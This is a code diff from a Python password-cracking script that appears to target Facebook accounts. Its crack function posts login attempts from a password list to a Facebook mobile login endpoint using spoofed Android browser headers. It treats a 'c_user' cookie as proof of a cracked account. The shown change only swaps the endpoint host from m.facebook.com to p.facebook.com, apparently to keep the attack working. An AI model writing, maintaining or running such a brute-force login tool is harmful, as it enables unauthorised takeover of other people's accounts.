@@ -310,7 +310,7 @@ def crack(uid, password_list, total_count):
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': 'Mozilla/5.0 (Linux; Android 13; RMX3241) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',}
-            respon = Session.post('https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=6d9da9466908b278e8a5e7bd73fb870e63617aab8043b395513d14d9e5028be2', cookies=cookies, headers=headers, data=log_data)
+            respon = Session.post('https://p.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=6d9da9466908b278e8a5e7bd73fb870e63617aab8043b395513d14d9e5028be2', cookies=cookies, headers=headers, data=log_data)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
